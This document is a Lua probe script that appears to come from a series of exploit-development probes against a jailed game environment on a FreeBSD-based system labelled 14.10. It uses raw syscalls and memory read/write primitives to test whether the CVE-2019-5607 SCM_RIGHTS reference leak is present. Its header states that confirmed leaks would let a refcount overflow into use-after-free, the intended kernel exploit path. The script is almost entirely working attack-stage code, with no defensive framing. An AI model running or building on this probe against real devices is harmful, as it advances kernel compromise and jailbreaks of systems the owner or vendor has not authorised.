-- CRASH_CLASS: MODERATE
-- PROBE 527a: GHOST HANDLE refcount leak test (CVE-2019-5607 pattern)
--
-- Context: 526a CONFIRMED SCM_RIGHTS works on 14.10 game jail.
-- CVE-2019-5607: when sendmsg with SCM_RIGHTS fails (e.g., buffer full),
-- the kernel may leak the fget() reference on the passed fd. Enough
-- leaked references overflow the 32-bit refcount → object freed while
-- references exist → UAF.
--
-- This probe tests:
--   [A] fd lifetime extension: send fd, close original, receive copy
--   [B] Reference leak detection: fill socket buffer, fail SCM_RIGHTS
--   [C] Inflight discard: close socket with SCM_RIGHTS in transit
--   [D] Double-send same fd: send fd N times, close, receive all
--   [E] SO_SNDBUF manipulation for tighter race window
--   [F] Rapid leak iteration (if leak detected in B)
--
-- If [B] shows leaked references, this is THE exploit path.

print("=== PROBE 527a: GHOST HANDLE refcount leak ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local pid = to_num(sc20())
print("pid: " .. pid)

local sc_socketpair = make_syscall(135)
local sc_sendmsg    = make_syscall(28)
local sc_recvmsg    = make_syscall(27)
local sc_close      = make_syscall(6)
local sc_open       = make_syscall(5)
local sc_fstat      = make_syscall(189)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_write      = make_syscall(4)
local sc_read       = make_syscall(3)
local sc_fcntl      = make_syscall(92)
local sc_ioctl      = make_syscall(54)

local AF_UNIX = 1
local SOCK_STREAM = 1
local SOCK_DGRAM = 2
local SOL_SOCKET = 0xFFFF
local SCM_RIGHTS = 1
local SO_SNDBUF = 0x1001
local SO_RCVBUF = 0x1002
local SO_ERROR  = 0x1007
local MSG_DONTWAIT = 0x80
local O_NONBLOCK = 0x4
local F_SETFL = 4
local F_GETFL = 3
local FIONBIO = 0x8004667E -- FreeBSD

local function zero_buf(addr, sz)
    for j = 0, sz - 1, 4 do safe_wd(addr + j, 0) end
end

-- Helper: create socketpair and return fd0, fd1
local function make_pair(sock_type)
    local sv = memory.alloc(16)
    zero_buf(sv, 16)
    local ok, ret = pcall(function()
        return sc_socketpair(uint64(AF_UNIX), uint64(sock_type), uint64(0), uint64(to_num(sv)))
    end)
    if ok and to_num(ret) == 0 then
        return safe_rd(sv), safe_rd(sv + 4)
    end
    return nil, nil
end

-- Helper: open /dev/rng for test fd
local function open_rng()
    local path = memory.alloc(16)
    safe_wd(path, 0x7665642F)     -- "/dev"
    safe_wd(path + 4, 0x676E722F) -- "/rng"
    safe_wd(path + 8, 0)
    local ok, ret = pcall(function()
        return sc_open(uint64(to_num(path)), uint64(0), uint64(0))
    end)
    return ok and to_num(ret) or -1
end

-- Helper: set socket non-blocking
local function set_nonblock(fd)
    local one = memory.alloc(4)
    safe_wd(one, 1)
    pcall(function()
        sc_ioctl(uint64(fd), uint64(FIONBIO), uint64(to_num(one)))
    end)
end

-- Helper: send fd via SCM_RIGHTS, return sendmsg retval
local function send_fd(sender_fd, fd_to_pass, flags)
    local CMSG_ALIGN_HDR = 16
    local cmsg_space = 24

    local msghdr = memory.alloc(0x40)
    local iov = memory.alloc(0x10)
    local data = memory.alloc(8)
    local cmsg = memory.alloc(0x40)

    zero_buf(msghdr, 0x40)
    zero_buf(iov, 0x10)
    zero_buf(cmsg, 0x40)

    safe_wd(data, 0x46) -- "F"
    safe_wq(iov, uint64(to_num(data)))
    safe_wq(iov + 8, uint64(1))

    safe_wd(cmsg + 0, CMSG_ALIGN_HDR + 4) -- cmsg_len = 20
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + CMSG_ALIGN_HDR, fd_to_pass)

    safe_wq(msghdr + 0x10, uint64(to_num(iov)))
    safe_wq(msghdr + 0x18, uint64(1))
    safe_wq(msghdr + 0x20, uint64(to_num(cmsg)))
    safe_wd(msghdr + 0x28, cmsg_space)

    local ok, ret = pcall(function()
        return sc_sendmsg(uint64(sender_fd), uint64(to_num(msghdr)), uint64(flags or 0))
    end)
    return ok and to_num(ret) or -999
end

-- Helper: receive fd via SCM_RIGHTS, return recv_ret, received_fd
local function recv_fd(receiver_fd)
    local CMSG_ALIGN_HDR = 16

    local msghdr = memory.alloc(0x40)
    local iov = memory.alloc(0x10)
    local data = memory.alloc(8)
    local cmsg = memory.alloc(256)

    zero_buf(msghdr, 0x40)
    zero_buf(iov, 0x10)
    for j = 0, 255, 4 do safe_wd(cmsg + j, 0xDEADBEEF) end

    safe_wq(iov, uint64(to_num(data)))
    safe_wq(iov + 8, uint64(4))

    safe_wq(msghdr + 0x10, uint64(to_num(iov)))
    safe_wq(msghdr + 0x18, uint64(1))
    safe_wq(msghdr + 0x20, uint64(to_num(cmsg)))
    safe_wd(msghdr + 0x28, 256)

    local ok, ret = pcall(function()
        return sc_recvmsg(uint64(receiver_fd), uint64(to_num(msghdr)), uint64(0))
    end)
    local recv_rv = ok and to_num(ret) or -999
    local controllen = safe_rd(msghdr + 0x28) or 0
    local received_fd = nil

    if controllen > 0 then
        local c_type = safe_rd(cmsg + 8)
        if c_type == SCM_RIGHTS then
            received_fd = safe_rd(cmsg + CMSG_ALIGN_HDR)
        end
    end

    return recv_rv, received_fd
end

-- Helper: check fd validity via fstat
local function fd_valid(fd)
    if not fd or fd < 0 then return false end
    local stat = memory.alloc(256)
    zero_buf(stat, 256)
    local ok, ret = pcall(function()
        return sc_fstat(uint64(fd), uint64(to_num(stat)))
    end)
    return ok and to_num(ret) == 0
end

-- ============================================================
-- [A] fd lifetime extension: send fd, close original, receive copy
-- Normal behavior test — received fd should still be valid
-- ============================================================
print("[A] fd lifetime extension")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local test_fd = open_rng()
    print(string.format("  pair: %d/%d, test_fd: %d", fd0 or -1, fd1 or -1, test_fd))

    if fd0 and fd1 and test_fd >= 0 then
        -- send
        local sr = send_fd(fd0, test_fd, 0)
        print(string.format("  sendmsg: ret=%d", sr))

        -- close original BEFORE receiving
        pcall(function() sc_close(uint64(test_fd)) end)
        print("  closed original fd " .. test_fd)

        -- receive copy
        local rr, got_fd = recv_fd(fd1)
        print(string.format("  recvmsg: ret=%d, got_fd=%s", rr, tostring(got_fd)))

        if got_fd then
            local valid = fd_valid(got_fd)
            print(string.format("  *** received fd %d valid: %s ***",
                got_fd, tostring(valid)))
            if valid then
                print("  fd SURVIVED close of original — lifetime extension works")
            end
            pcall(function() sc_close(uint64(got_fd)) end)
        end
    end
    if fd0 then pcall(function() sc_close(uint64(fd0)) end) end
    if fd1 then pcall(function() sc_close(uint64(fd1)) end) end
end

-- ============================================================
-- [B] Reference leak on failed sendmsg (CVE-2019-5607 core test)
-- Fill socket buffer, then try SCM_RIGHTS — should fail EAGAIN
-- If reference leaks, repeated failures will eventually overflow refcount
-- ============================================================
print("")
print("[B] Reference leak on failed sendmsg")
do
    local fd0, fd1 = make_pair(SOCK_DGRAM)
    local test_fd = open_rng()
    print(string.format("  pair: %d/%d, test_fd: %d", fd0 or -1, fd1 or -1, test_fd))

    if fd0 and fd1 and test_fd >= 0 then
        -- Set non-blocking on sender
        set_nonblock(fd0)

        -- Check socket buffer sizes
        local optbuf = memory.alloc(16)
        local optlen = memory.alloc(8)
        safe_wd(optlen, 4)
        pcall(function()
            sc_getsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                uint64(to_num(optbuf)), uint64(to_num(optlen)))
        end)
        local sndbuf = safe_rd(optbuf) or 0
        safe_wd(optlen, 4)
        pcall(function()
            sc_getsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                uint64(to_num(optbuf)), uint64(to_num(optlen)))
        end)
        local rcvbuf = safe_rd(optbuf) or 0
        print(string.format("  SO_SNDBUF=%d, SO_RCVBUF=%d", sndbuf, rcvbuf))

        -- Try to reduce buffer size
        safe_wd(optbuf, 1)
        pcall(function()
            sc_setsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                uint64(to_num(optbuf)), uint64(4))
        end)
        safe_wd(optbuf, 1)
        pcall(function()
            sc_setsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                uint64(to_num(optbuf)), uint64(4))
        end)

        -- Re-check
        safe_wd(optlen, 4)
        pcall(function()
            sc_getsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                uint64(to_num(optbuf)), uint64(to_num(optlen)))
        end)
        local sndbuf2 = safe_rd(optbuf) or 0
        safe_wd(optlen, 4)
        pcall(function()
            sc_getsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                uint64(to_num(optbuf)), uint64(to_num(optlen)))
        end)
        local rcvbuf2 = safe_rd(optbuf) or 0
        print(string.format("  after minimize: SO_SNDBUF=%d, SO_RCVBUF=%d", sndbuf2, rcvbuf2))

        -- Fill the socket buffer with regular data until EAGAIN
        local fill_data = memory.alloc(4096)
        for j = 0, 4095, 4 do safe_wd(fill_data + j, 0x41414141) end

        local fill_count = 0
        local fill_bytes = 0
        for i = 1, 200 do
            local ok, ret = pcall(function()
                return sc_write(uint64(fd0), uint64(to_num(fill_data)), uint64(1024))
            end)
            local rv = ok and to_num(ret) or -999
            if rv > 0 then
                fill_count = fill_count + 1
                fill_bytes = fill_bytes + rv
            else
                print(string.format("  buffer full after %d writes (%d bytes), write ret=%d",
                    fill_count, fill_bytes, rv))
                break
            end
        end

        if fill_count >= 200 then
            print("  WARNING: wrote 200 times without filling — buffer may be huge")
        end

        -- NOW try SCM_RIGHTS sendmsg with buffer full
        -- This SHOULD fail (EAGAIN/ENOBUFS)
        -- If CVE-2019-5607 is present, the fget() reference leaks
        print("")
        print("  Attempting SCM_RIGHTS sendmsg with full buffer:")
        local fail_count = 0
        local success_count = 0
        local last_err = 0

        for i = 1, 50 do
            local sr = send_fd(fd0, test_fd, MSG_DONTWAIT)
            if sr < 0 then
                fail_count = fail_count + 1
                if fail_count <= 3 then
                    print(string.format("    attempt %d: FAILED ret=%d", i, sr))
                end
            else
                success_count = success_count + 1
                if success_count <= 3 then
                    print(string.format("    attempt %d: SUCCESS ret=%d (unexpected!)", i, sr))
                end
            end
        end
        print(string.format("  50 attempts: %d failed, %d succeeded", fail_count, success_count))

        if fail_count > 0 then
            print("")
            print("  *** KEY TEST: checking if test_fd is still valid after failed sends ***")
            local still_valid = fd_valid(test_fd)
            print(string.format("  test_fd (%d) valid: %s", test_fd, tostring(still_valid)))

            if still_valid then
                print("  fd still valid — cannot detect refcount leak from userland directly")
                print("  Need to drain receiver and check if phantom fds appear")

                -- Drain receiver and count received fds
                set_nonblock(fd1)
                local phantom_fds = 0
                local regular_msgs = 0
                for i = 1, 300 do
                    local rr, got_fd = recv_fd(fd1)
                    if rr < 0 then break end
                    if got_fd and got_fd >= 0 then
                        phantom_fds = phantom_fds + 1
                        if phantom_fds <= 5 then
                            print(string.format("    phantom fd #%d: %d (valid=%s)",
                                phantom_fds, got_fd, tostring(fd_valid(got_fd))))
                        end
                        pcall(function() sc_close(uint64(got_fd)) end)
                    else
                        regular_msgs = regular_msgs + 1
                    end
                end
                print(string.format("  drained: %d regular msgs, %d phantom fds",
                    regular_msgs, phantom_fds))

                if phantom_fds > 0 and phantom_fds > success_count then
                    print("  *** MORE phantom fds than successful sends — LEAK DETECTED ***")
                elseif phantom_fds == success_count then
                    print("  phantom fds = success count — no leak detected in this test")
                end
            end
        end

        pcall(function() sc_close(uint64(test_fd)) end)
    end
    if fd0 then pcall(function() sc_close(uint64(fd0)) end) end
    if fd1 then pcall(function() sc_close(uint64(fd1)) end) end
end

-- ============================================================
-- [C] Close socket with inflight SCM_RIGHTS
-- Send fd, close sender socket BEFORE receiver reads, then receive
-- ============================================================
print("")
print("[C] Close sender with inflight SCM_RIGHTS")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local test_fd = open_rng()
    print(string.format("  pair: %d/%d, test_fd: %d", fd0 or -1, fd1 or -1, test_fd))

    if fd0 and fd1 and test_fd >= 0 then
        -- Send fd
        local sr = send_fd(fd0, test_fd, 0)
        print(string.format("  sendmsg: ret=%d", sr))

        -- Close sender socket with message in flight
        pcall(function() sc_close(uint64(fd0)) end)
        print("  closed sender socket fd0=" .. fd0)
        fd0 = nil

        -- Can we still receive?
        local rr, got_fd = recv_fd(fd1)
        print(string.format("  recvmsg after sender close: ret=%d, got_fd=%s",
            rr, tostring(got_fd)))

        if got_fd then
            local valid = fd_valid(got_fd)
            print(string.format("  *** received fd %d valid=%s after sender close ***",
                got_fd, tostring(valid)))
            pcall(function() sc_close(uint64(got_fd)) end)
        else
            print("  NO fd received — message discarded when sender closed")
        end

        pcall(function() sc_close(uint64(test_fd)) end)
    end
    if fd0 then pcall(function() sc_close(uint64(fd0)) end) end
    if fd1 then pcall(function() sc_close(uint64(fd1)) end) end
end

-- ============================================================
-- [D] Double-send same fd N times, close original, receive all
-- Tests reference counting: each received fd should work
-- ============================================================
print("")
print("[D] Send same fd 10 times, close original, receive all")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local test_fd = open_rng()
    print(string.format("  pair: %d/%d, test_fd: %d", fd0 or -1, fd1 or -1, test_fd))

    if fd0 and fd1 and test_fd >= 0 then
        local send_ok = 0
        for i = 1, 10 do
            local sr = send_fd(fd0, test_fd, 0)
            if sr > 0 then send_ok = send_ok + 1 end
        end
        print(string.format("  sent %d/10 times", send_ok))

        -- Close original
        pcall(function() sc_close(uint64(test_fd)) end)
        print("  closed original fd " .. test_fd)

        -- Receive all
        local recv_ok = 0
        local all_valid = true
        local received_fds = {}
        for i = 1, 10 do
            local rr, got_fd = recv_fd(fd1)
            if got_fd then
                recv_ok = recv_ok + 1
                local valid = fd_valid(got_fd)
                if not valid then all_valid = false end
                table.insert(received_fds, got_fd)
                if i <= 3 or not valid then
                    print(string.format("    recv #%d: fd=%d valid=%s", i, got_fd, tostring(valid)))
                end
            end
        end
        print(string.format("  received %d/%d fds, all valid: %s",
            recv_ok, send_ok, tostring(all_valid)))

        -- Close all received fds
        for _, fd in ipairs(received_fds) do
            pcall(function() sc_close(uint64(fd)) end)
        end

        -- After closing all copies, verify no dangling references
        -- Try to use one of the fd numbers again
        local reuse_fd = open_rng()
        print(string.format("  after cleanup, new fd: %d", reuse_fd))
        if reuse_fd >= 0 then
            pcall(function() sc_close(uint64(reuse_fd)) end)
        end
    end
    if fd0 then pcall(function() sc_close(uint64(fd0)) end) end
    if fd1 then pcall(function() sc_close(uint64(fd1)) end) end
end

-- ============================================================
-- [E] SO_SNDBUF/SO_RCVBUF manipulation
-- Check min buffer sizes and if we can create very tight windows
-- ============================================================
print("")
print("[E] Socket buffer size manipulation")
do
    local fd0, fd1 = make_pair(SOCK_DGRAM)
    if fd0 and fd1 then
        local optbuf = memory.alloc(16)
        local optlen = memory.alloc(8)

        -- Test range of SNDBUF values
        for _, sz in ipairs({0, 1, 64, 128, 256, 512, 1024, 2048, 4096}) do
            safe_wd(optbuf, sz)
            local ok, ret = pcall(function()
                return sc_setsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                    uint64(to_num(optbuf)), uint64(4))
            end)
            local rv = ok and to_num(ret) or -999
            -- Read back actual value
            safe_wd(optlen, 4)
            safe_wd(optbuf, 0)
            pcall(function()
                sc_getsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                    uint64(to_num(optbuf)), uint64(to_num(optlen)))
            end)
            local actual = safe_rd(optbuf) or 0
            print(string.format("  setsockopt(SNDBUF=%d): ret=%d, actual=%d", sz, rv, actual))
        end

        -- Same for RCVBUF
        print("  ---")
        for _, sz in ipairs({0, 1, 64, 128, 256, 512, 1024}) do
            safe_wd(optbuf, sz)
            pcall(function()
                sc_setsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                    uint64(to_num(optbuf)), uint64(4))
            end)
            safe_wd(optlen, 4)
            safe_wd(optbuf, 0)
            pcall(function()
                sc_getsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                    uint64(to_num(optbuf)), uint64(to_num(optlen)))
            end)
            local actual = safe_rd(optbuf) or 0
            print(string.format("  setsockopt(RCVBUF=%d): actual=%d", sz, actual))
        end

        pcall(function() sc_close(uint64(fd0)) end)
        pcall(function() sc_close(uint64(fd1)) end)
    end
end

-- ============================================================
-- [F] High-volume send/fail cycle with metrics
-- Attempt 1000 failed SCM_RIGHTS sends and track behavior
-- ============================================================
print("")
print("[F] High-volume failed SCM_RIGHTS (1000 iterations)")
do
    local fd0, fd1 = make_pair(SOCK_DGRAM)
    local test_fd = open_rng()

    if fd0 and fd1 and test_fd >= 0 then
        set_nonblock(fd0)

        -- Minimize buffers
        local optbuf = memory.alloc(16)
        safe_wd(optbuf, 1)
        pcall(function()
            sc_setsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                uint64(to_num(optbuf)), uint64(4))
        end)
        safe_wd(optbuf, 1)
        pcall(function()
            sc_setsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                uint64(to_num(optbuf)), uint64(4))
        end)

        -- Fill buffer
        local fill_data = memory.alloc(4096)
        for j = 0, 4095, 4 do safe_wd(fill_data + j, 0x42) end
        local filled = 0
        for i = 1, 500 do
            local ok, ret = pcall(function()
                return sc_write(uint64(fd0), uint64(to_num(fill_data)), uint64(2048))
            end)
            if ok and to_num(ret) > 0 then
                filled = filled + to_num(ret)
            else
                break
            end
        end
        print(string.format("  filled %d bytes", filled))

        -- Attempt 1000 SCM_RIGHTS sends that should fail
        local fails = 0
        local successes = 0
        local errors = 0
        for i = 1, 1000 do
            local sr = send_fd(fd0, test_fd, MSG_DONTWAIT)
            if sr > 0 then
                successes = successes + 1
            elseif sr == -999 then
                errors = errors + 1
            else
                fails = fails + 1
            end
        end
        print(string.format("  1000 attempts: %d fails, %d success, %d errors",
            fails, successes, errors))

        -- Check fd validity after mass failed sends
        local still_valid = fd_valid(test_fd)
        print(string.format("  test_fd valid after 1000 attempts: %s", tostring(still_valid)))

        -- Drain and count
        set_nonblock(fd1)
        local drained_fds = 0
        local drained_data = 0
        for i = 1, 2000 do
            local rr, got_fd = recv_fd(fd1)
            if rr < 0 then break end
            if got_fd and got_fd >= 0 then
                drained_fds = drained_fds + 1
                pcall(function() sc_close(uint64(got_fd)) end)
            else
                drained_data = drained_data + 1
            end
        end
        print(string.format("  drained: %d data msgs, %d fd msgs", drained_data, drained_fds))
        print(string.format("  expected fd msgs (from successes): %d", successes))

        if drained_fds > successes then
            print(string.format("  *** ANOMALY: %d extra phantom fds — POSSIBLE LEAK ***",
                drained_fds - successes))
        elseif drained_fds == successes then
            print("  fd count matches — clean accounting")
        else
            print(string.format("  fd count LOWER by %d — messages may have been discarded",
                successes - drained_fds))
        end

        pcall(function() sc_close(uint64(test_fd)) end)
    end
    if fd0 then pcall(function() sc_close(uint64(fd0)) end) end
    if fd1 then pcall(function() sc_close(uint64(fd1)) end) end
end

-- ============================================================
-- [G] SOCK_STREAM variant (different kernel path)
-- ============================================================
print("")
print("[G] SOCK_STREAM fill-and-fail variant")
do
    local fd0, fd1 = make_pair(SOCK_STREAM)
    local test_fd = open_rng()

    if fd0 and fd1 and test_fd >= 0 then
        set_nonblock(fd0)
        set_nonblock(fd1)

        -- Minimize buffers
        local optbuf = memory.alloc(16)
        safe_wd(optbuf, 1)
        pcall(function()
            sc_setsockopt(uint64(fd0), uint64(SOL_SOCKET), uint64(SO_SNDBUF),
                uint64(to_num(optbuf)), uint64(4))
        end)
        safe_wd(optbuf, 1)
        pcall(function()
            sc_setsockopt(uint64(fd1), uint64(SOL_SOCKET), uint64(SO_RCVBUF),
                uint64(to_num(optbuf)), uint64(4))
        end)

        -- Fill
        local fill_data = memory.alloc(4096)
        for j = 0, 4095, 4 do safe_wd(fill_data + j, 0x43) end
        local filled = 0
        for i = 1, 500 do
            local ok, ret = pcall(function()
                return sc_write(uint64(fd0), uint64(to_num(fill_data)), uint64(4096))
            end)
            if ok and to_num(ret) > 0 then
                filled = filled + to_num(ret)
            else
                break
            end
        end
        print(string.format("  filled %d bytes (SOCK_STREAM)", filled))

        -- 200 failed SCM_RIGHTS
        local fails = 0
        local successes = 0
        for i = 1, 200 do
            local sr = send_fd(fd0, test_fd, MSG_DONTWAIT)
            if sr > 0 then successes = successes + 1
            else fails = fails + 1 end
        end
        print(string.format("  200 attempts: %d fails, %d success", fails, successes))

        -- Drain
        local drained_fds = 0
        local drained_data = 0
        for i = 1, 1000 do
            local rr, got_fd = recv_fd(fd1)
            if rr < 0 then break end
            if got_fd and got_fd >= 0 then
                drained_fds = drained_fds + 1
                pcall(function() sc_close(uint64(got_fd)) end)
            else
                drained_data = drained_data + 1
            end
        end
        print(string.format("  drained: %d data, %d fds (expected %d)",
            drained_data, drained_fds, successes))

        if drained_fds ~= successes then
            print(string.format("  *** MISMATCH: delta=%d ***", drained_fds - successes))
        else
            print("  clean accounting")
        end

        pcall(function() sc_close(uint64(test_fd)) end)
    end
    if fd0 then pcall(function() sc_close(uint64(fd0)) end) end
    if fd1 then pcall(function() sc_close(uint64(fd1)) end) end
end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("If any section shows MORE phantom/drained fds than successful sends,")
print("or if close-sender-with-inflight yields a valid fd,")
print("then a refcount leak or lifetime bug exists.")
print("If all accounting is clean, CVE-2019-5607 is likely patched on 14.10.")
print("")

local pid2 = to_num(sc20())
print("pid: " .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("")
print("=== PROBE 527a COMPLETE ===")
